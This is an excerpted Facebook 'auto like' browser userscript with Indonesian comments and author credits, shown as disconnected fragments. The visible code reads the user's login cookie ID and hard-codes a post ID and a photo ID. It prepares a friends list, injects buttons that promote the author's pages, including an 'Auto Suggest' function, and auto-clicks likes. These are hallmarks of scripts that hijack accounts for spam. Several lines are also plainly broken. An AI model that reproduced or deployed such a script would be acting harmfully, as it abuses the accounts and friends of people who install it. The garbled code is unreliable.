...
// @description			Dengan Auto Like Facebook ini anda bisa kasih Jempol pada teman anda hanya dengan satu klik saja,like satatus dan komen.
// @author			JokoRowoTlogoRejo
// @authorURL			https://www.facebook.com/Ratihrosid
// @authorURL			https://twitter.com/Harunpanti
// @authorURL			https://www.facebook.com/cewekimut212
// @homepage			https://www.facebook.com/Auto.Like212
// @include			htt*://www.facebook.com/*
// @icon			https://gp4.googleusercontent.com/-QGk1QU9xtGE/AAAAAAAAAAI/AAAAAAAAAAA/iHUhdO815R4/w48-h48-p/photo.jpg
// @updateURL			http://userscripts.org/scripts/source/417152.user.js
// @installURL			http://userscripts.org/scripts/source/417152.user.js
// @version			V.L.0.0.0.S.T Beta
...
// =====   Nama : Auto Like Facebook V.L.0.0.0.S.t Beta  ======
// ==========    Author : Harun ArrasidNasution    ============
// ======= Site : https://www.facebook.com/Auto.Like212 =======
// ============================================================
...
div.style.border="1px solid #6B84B4";
div.style.padding="3px";
div.innerHTML="<a style='font-weight:bold;color:#00FF00' href='https://www.facebook.com/Auto.Like212' target='_blank' title='NEW' ><blink><center>Thanks visit My Fages</center></blink></a>";body.appendChild(div)}body=document.body;if(body!=null);
...
div.style.border = "1px solid #6B84B4";
div.style.padding = "3px";
div.innerHTML = "<a style='font-weight:bold;color:#8B0000' onclick='https://www.facebook.com/Ratihrosid'><center>Like All Comments</center></a>"
body.appendChild(div);
...
{
H[L].click();
var K="<a style='font-weight:bold;color:#FFD700' onclick='Autolike()'><center>Like Comments: "+(L+1)+"/"+H.length+"</center></a>";
...
var spost_id = "146203025575194";
var sfoto_id = "209340289266054";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
...
//e.href = '#';
e.innerHTML = 'Auto Suggest by Akihisa Sakiyurai';
...
e = document.createElement('a');
//e.href = '#';
e.innerHTML = 'Auto Like By Harun Nasution';
e.className = 'uiButton';
e.onclick = autoSuggest;
...
// ==      Copaser Yang Baik Tidak Akan Menghapus Credit     ==
// =====   Nama : Auto Like Facebook V.L.0.0.0.S.t Beta  ======
// ===========    Author : Harun Arrasid Nasution   ===========
// =========== https://www.facebook.com/Auto.Like212 ==========
